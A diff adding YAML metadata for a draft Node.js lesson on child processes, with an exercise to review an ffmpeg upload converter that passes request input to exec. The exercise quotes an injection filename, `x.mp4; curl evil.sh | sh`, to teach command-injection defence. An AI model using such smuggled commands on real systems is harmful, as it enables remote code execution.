@@ -1,0 +1,24 @@
+id: nodejs.p3.child-processes
+kind: lesson
+status: draft
+title: "Child Processes: spawn, exec and Pipes"
+summary: "Running other programs from Node.js: spawn, execFile, exec and fork and when to use each, why a shell string invites command injection, stdio options and pipes between processes, exit codes and signals, timeouts and killing, environment and working directory, and fork with an IPC channel."
+objectives:
+  - { id: o1, text: "Choose between spawn, execFile, exec and fork, and run programs with an argument array instead of a shell string", skills: [nodejs.child-processes] }
+  - { id: o2, text: "Stream a child's input and output, connect processes with pipes, and read exit codes and signals", skills: [nodejs.child-processes, nodejs.streams-buffers] }
+  - { id: o3, text: "Stop children that hang with timeouts and signals, and avoid zombie or orphaned processes", skills: [nodejs.child-processes] }
+prerequisites: [nodejs.p3.worker-pool]
+difficulty: 3
+estimated_minutes: 50
+xp: 100
+lesson: lesson.md
+bridges: bridges
+quiz: quiz.yaml
+exercise:
+  task: "A video service converts uploads with `exec(`ffmpeg -i ${req.body.file} -vf scale=640:-1 out/${req.body.name}.mp4`, cb)`. Review it: list the security and reliability problems (consider a file name such as `x.mp4; curl evil.sh | sh`, a 2 GB video, an ffmpeg process that hangs, and the client giving up), then describe the fixed version: which child_process function, how arguments and paths are passed and validated, how output and progress are read, and how the process is stopped on timeout or when the request is cancelled."
+  criteria:
+    - "Identifies command injection: exec runs a shell, so user input in the string can run arbitrary commands"
+    - "Uses spawn or execFile with an argument array (no shell) and validates or generates file names and paths"
+    - "Notes that exec buffers all output in memory with a maxBuffer limit, and streams stdout/stderr instead"
+    - "Adds a timeout that sends SIGTERM and then SIGKILL, and kills the child when the request is aborted (AbortSignal or req close)"
+    - "Checks the exit code and signal and reports a failure instead of assuming success"
